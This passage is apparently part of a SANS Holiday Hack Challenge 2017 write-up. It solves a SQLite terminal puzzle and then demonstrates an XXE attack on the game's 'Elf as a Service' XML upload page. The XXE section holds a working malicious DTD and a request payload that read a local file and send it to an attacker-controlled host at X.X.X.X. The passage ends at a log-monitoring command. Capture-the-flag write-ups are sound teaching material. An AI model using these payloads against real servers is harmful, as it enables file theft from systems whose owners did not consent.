&lt;p&gt;We now have the name of four more probable Munchkin moles, which gives us a
total of six Munchkin moles.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="sixth-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id44"&gt;Sixth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-i-don-t-think-we-re-in-kansas-anymore"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id45"&gt;North Pole and Beyond: I don't think we're in Kansas anymore&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id10"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id46"&gt;Cranberry Pi&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
&lt;/pre&gt;
&lt;p&gt;After finding the least popular browser, we must now find the most popular song
in the database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@e3f1a585649d:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 21M&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 root root  16M Nov 29 19:28 christmassongs.db&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 5.0M Dec  7 15:10 runtoanswer&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A database in a single flat file indicates that it's most likely a SQLite
database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@e3f1a585649d:~$&lt;/span&gt; sqlite3 ./christmassongs.db
&lt;span class="go"&gt;SQLite version 3.11.0 2016-02-15 17:29:24&lt;/span&gt;
&lt;span class="go"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="go"&gt;sqlite&amp;gt; .tables&lt;/span&gt;
&lt;span class="go"&gt;likes  songs&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have two tables, one named &lt;code&gt;likes&lt;/code&gt;, one named &lt;code&gt;songs&lt;/code&gt;. Let's
see their structure:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;sqlite&amp;gt; .schema&lt;/span&gt;
&lt;span class="go"&gt;CREATE TABLE songs(&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;  id INTEGER PRIMARY KEY AUTOINCREMENT,&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;  title TEXT,&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;  artist TEXT,&lt;/span&gt;
&lt;span class="go"&gt;  year TEXT,&lt;/span&gt;
&lt;span class="go"&gt;  notes TEXT&lt;/span&gt;
&lt;span class="go"&gt;);&lt;/span&gt;
&lt;span class="go"&gt;CREATE TABLE likes(&lt;/span&gt;
&lt;span class="go"&gt;  id INTEGER PRIMARY KEY AUTOINCREMENT,&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;  like INTEGER,&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;  datetime INTEGER,&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;  songid INTEGER,&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;  FOREIGN KEY(songid) REFERENCES songs(id)&lt;/span&gt;
&lt;span class="go"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;songs&lt;/code&gt; table is pretty straightforward. The &lt;code&gt;likes&lt;/code&gt; table
holds the number of likes for every song, using the song's id. If the
column &lt;code&gt;like&lt;/code&gt; is 1, then the song was liked.&lt;/p&gt;
&lt;p&gt;We can query the database to get the number of likes for every song id.
The correct query was found after reading &lt;a class="reference external" href="http://www.sqlitetutorial.net/sqlite-count-function/"&gt;this tutorial on the COUNT function&lt;/a&gt;.
This query will get the song id, their number of likes, and will sort them from
least to most liked.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;sqlite&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;songid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;likes&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;like&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;GROUP&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="n"&gt;songid&lt;/span&gt; &lt;span class="k"&gt;ORDER&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1698&lt;/span&gt;
&lt;span class="mi"&gt;199&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1702&lt;/span&gt;
&lt;span class="mi"&gt;98&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1706&lt;/span&gt;
&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1715&lt;/span&gt;
&lt;span class="mi"&gt;134&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1719&lt;/span&gt;
&lt;span class="mi"&gt;265&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1720&lt;/span&gt;
&lt;span class="mi"&gt;245&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1756&lt;/span&gt;
&lt;span class="mi"&gt;392&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;8996&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, the song with the id 392 is the most liked song. Now, we could query
the &lt;code&gt;songs&lt;/code&gt; manually... Or! We could use an &lt;a class="reference external" href="http://www.sqlitetutorial.net/sqlite-inner-join/"&gt;inner junction&lt;/a&gt;,
just for the fun:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;sqlite&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;likes&lt;/span&gt; &lt;span class="k"&gt;INNER&lt;/span&gt; &lt;span class="k"&gt;JOIN&lt;/span&gt; &lt;span class="n"&gt;songs&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="n"&gt;songs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;likes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;songid&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;like&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;GROUP&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="n"&gt;songid&lt;/span&gt; &lt;span class="k"&gt;ORDER&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;Farted&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="n"&gt;Santa&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s Lap (Now Christmas Is Gonna Stink for Me)|1689&lt;/span&gt;
&lt;/span&gt;&lt;span class="s1"&gt;Why Couldn&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;It&lt;/span&gt; &lt;span class="n"&gt;Be&lt;/span&gt; &lt;span class="n"&gt;Christmas&lt;/span&gt; &lt;span class="k"&gt;Every&lt;/span&gt; &lt;span class="k"&gt;Day&lt;/span&gt;&lt;span class="o"&gt;?|&lt;/span&gt;&lt;span class="mi"&gt;1691&lt;/span&gt;
&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;Baby&lt;/span&gt; &lt;span class="n"&gt;Changes&lt;/span&gt; &lt;span class="n"&gt;Everything&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1693&lt;/span&gt;
&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;ll&lt;/span&gt; &lt;span class="n"&gt;Be&lt;/span&gt; &lt;span class="n"&gt;Home&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1695&lt;/span&gt;
&lt;span class="k"&gt;Old&lt;/span&gt; &lt;span class="n"&gt;Time&lt;/span&gt; &lt;span class="n"&gt;Christmas&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1696&lt;/span&gt;
&lt;span class="n"&gt;Cold&lt;/span&gt; &lt;span class="n"&gt;December&lt;/span&gt; &lt;span class="n"&gt;Night&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1697&lt;/span&gt;
&lt;span class="n"&gt;Blue&lt;/span&gt; &lt;span class="n"&gt;Holiday&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1698&lt;/span&gt;
&lt;span class="n"&gt;Home&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;Christmas&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1702&lt;/span&gt;
&lt;span class="n"&gt;Christmas&lt;/span&gt; &lt;span class="n"&gt;Memories&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1706&lt;/span&gt;
&lt;span class="n"&gt;Christmas&lt;/span&gt; &lt;span class="k"&gt;Is&lt;/span&gt; &lt;span class="n"&gt;Now&lt;/span&gt; &lt;span class="n"&gt;Drawing&lt;/span&gt; &lt;span class="n"&gt;Near&lt;/span&gt; &lt;span class="k"&gt;at&lt;/span&gt; &lt;span class="n"&gt;Hand&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1715&lt;/span&gt;
&lt;span class="n"&gt;Coventry&lt;/span&gt; &lt;span class="n"&gt;Carol&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1719&lt;/span&gt;
&lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;Little&lt;/span&gt; &lt;span class="n"&gt;Boy&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;Santa&lt;/span&gt; &lt;span class="n"&gt;Claus&lt;/span&gt; &lt;span class="n"&gt;Forgot&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1720&lt;/span&gt;
&lt;span class="n"&gt;Joy&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;World&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;1756&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="n"&gt;Stairway&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Heaven&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;8996&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The most-liked song this Christmas seems to be &lt;a class="reference external" href="https://www.youtube.com/watch?v=cwFQpRTwaP0"&gt;Stairway to Heaven&lt;/a&gt;.
Although &lt;a class="reference external" href="https://www.youtube.com/watch?v=FlFjR2vUy3M"&gt;I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)&lt;/a&gt;
seems to be doing pretty well!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ef4955c61cfe:~$&lt;/span&gt; ./runtoanswer
&lt;span class="go"&gt;Starting up, please wait......&lt;/span&gt;
&lt;span class="go"&gt;Enter the name of the song with the most likes: Stairway to Heaven&lt;/span&gt;
&lt;span class="go"&gt;That is the #1 Christmas song, congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id11"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id47"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Having the found the most popular song for this Christmas, we're given a new
object: the Portal, which can create a duplicate of our snowball in a second
place.&lt;/p&gt;
&lt;img alt="i_dont_think_we_re_in_kansas_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_terminal.png" /&gt;
&lt;p&gt;Here's the layout:&lt;/p&gt;
&lt;img alt="i_dont_think_we_re_in_kansas_anymore.gif" class="align-center" src="/images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_anymore.gif" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-elf-as-a-service-platform"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id48"&gt;North Pole Christmas Town infrastructure: Elf as a Service platform&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The Elf as a Service platform is a web application where you can order new
elves. To do so, you only have to upload an XML files, containing the details
of th elves you wish to order:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/Home/DisplayXml&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;eaas.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1946&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://eaas.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu&lt;/span&gt;

------WebKitFormBoundaryflybX2ZBWLwspXMu
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;Elfdata.xml&amp;quot;
Content-Type: text/xml

&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;1&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Elf On a Shelf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;1.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;On a Shelf, Obviously&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;2&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Buddy the Elf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;2.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;New York City&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;3&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Legolas&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;3.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;Middle Earth&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;4&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Marcus Elf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;4.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;Canada&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;5&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Alf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;5.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;Melmac&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;6&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Dobby the House Elf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;6.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;London&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;7&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Malekith&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;7.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;Asgard&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;8&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Keebler Elf&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;8.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;Tree&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;Elf&amp;gt;&amp;lt;ElfID&amp;gt;9&amp;lt;/ElfID&amp;gt;&amp;lt;ElfName&amp;gt;Jangle Bells&amp;lt;/ElfName&amp;gt;&amp;lt;Contact&amp;gt;8675309&amp;lt;/Contact&amp;gt;&amp;lt;DateOfPurchase&amp;gt;11/29/2017 12:00:00 AM&amp;lt;/DateOfPurchase&amp;gt;&amp;lt;Picture&amp;gt;9.png&amp;lt;/Picture&amp;gt;&amp;lt;Address&amp;gt;North Pole&amp;lt;/Address&amp;gt;&amp;lt;/Elf&amp;gt;&amp;lt;/Elf&amp;gt;

------WebKitFormBoundaryflybX2ZBWLwspXMu--
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="eaas_application.png" class="align-center" src="/images/sans-christmas-challenge-2017/eaas_application.png" /&gt;
&lt;p&gt;Hmm, that's interesting. Uploading XML files can often lead to eXternal XML
Entities (XXE) attacks. If the XML parser on the server side does not filter
XML entities, we can make the server perform several actions, such as outputing
the content of a local file, etc. More details are given in this &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities"&gt;SANS blog
post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Since we want to recover the content of &lt;code&gt;C:\greatbook.txt&lt;/code&gt;, let's
implement the attack, as given in the above tutorial. First, we'll host a
malicious .dtd file on our public facing server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY % stolendata SYSTEM &amp;quot;file:///c:/greatbook.txt&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!ENTITY % inception &amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; sendit SYSTEM &amp;#39;http://X.X.X.X/greatbook?%stolendata;&amp;#39;&amp;gt;&lt;/span&gt;&amp;quot;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, we'll send our malicious XML file to the EaaS application:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;POST /Home/DisplayXml HTTP/1.1
Host: eaas.northpolechristmastown.com
Content-Length: 731
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu

------WebKitFormBoundaryflybX2ZBWLwspXMu
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;Elfdata.xml&amp;quot;
Content-Type: text/xml

&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!DOCTYPE demo [&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="cp"&gt;     &amp;lt;!ELEMENT demo ANY &amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;     &lt;span class="cp"&gt;&amp;lt;!ENTITY % extentity SYSTEM &amp;quot;http://X.X.X.X/evil.dtd&amp;quot;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;     %extentity;
&lt;/span&gt;&lt;span class="hll"&gt;     %inception;
&lt;/span&gt;&lt;span class="hll"&gt;     %sendit;
&lt;/span&gt;      ]
&amp;gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Elf&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Elf&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;ElfID&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;1&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;ElfID&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;ElfName&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Elf On a Shelf&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;ElfName&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Contact&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;8675309&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Contact&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;DateOfPurchase&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;11/29/2017 12:00:00 AM&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;DateOfPurchase&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Picture&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;1.png&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Picture&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;Address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;On a shelf, obviously&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Elf&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;Elf&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

------WebKitFormBoundaryflybX2ZBWLwspXMu--
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now trigger the XML parser by visiting the &lt;code&gt;/Home/DisplayXml&lt;/code&gt; page,
which will trigger the downloading of our evil .dtd file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; tail -f access.log &lt;span class="p"&gt;|&lt;/span&gt; grep -E &lt;span class="s1"&gt;&amp;#39;greatbook|evil.dtd&amp;#39;&lt;/span&gt;
